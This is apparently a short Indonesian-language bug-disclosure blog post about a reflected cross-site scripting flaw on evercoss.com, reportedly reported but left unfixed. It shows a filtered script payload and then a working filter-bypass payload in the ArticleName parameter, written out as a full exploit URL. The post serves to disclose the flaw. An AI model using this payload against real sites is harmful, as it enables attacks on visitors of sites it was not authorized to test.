---
title: Reflected XSS at evercoss.com
author: mrhidden
date: '2020-02-25T02:38:00.000-08:00'
categories: [Blogging, Exploit]
tags: [xss]
---

![](https://1.bp.blogspot.com/-F3_STrY3qfY/XlT1s1_IliI/AAAAAAAAAvY/JpDsXUMtcwg_EpCPEoeSTubydd7Dm8D_wCLcBGAsYHQ/s1600/Screenshot_13.png)

  
Sebenarnya bug ini sudah lama saya temukan, dan juga sudah pernah saya report cuma ya gak ada tanggapan.  
  
Bug ini saya temukan sekitar bulan 6 tahun lalu kalau gak salah, tapi saya coba lagi dan ternyata bug ini belum juga di perbaiki.  
  
Ok sebelum lanjut membaca mohon baca dulu [DISCLAIMER](/disclaimer), jika sudah baca berarti anda setuju dengan apa yang saya tulis.  
  
Bug ini terletak pada url http://evercoss.com/article?ArticleName= , nah disini saya mencoba memasukkan payload seperti biasa `<script>alert(1);</script>` tapi kefilter menjadi `\[removed\]alert(1);\[removed\]`
  
Kemudian saya coba bypass menggunakan payload seperti ini  
  
```
" onclick=prompt(document.domain)//<button ‘ onclick=prompt(document.domain)//> \*/ prompt(document.domain)//
```
  
hingga menjadi menjadi seperti ini  
```
http://evercoss.com/article?ArticleName=**" onclick=prompt(document.domain)//<button ‘ onclick=prompt(document.domain)//> \*/ prompt(document.domain)//**  
```
Setelah saya memasukkan payload seperti ini timbul lah pop up xss tersebut  
  
Jelasnya bisa lihat video dibawah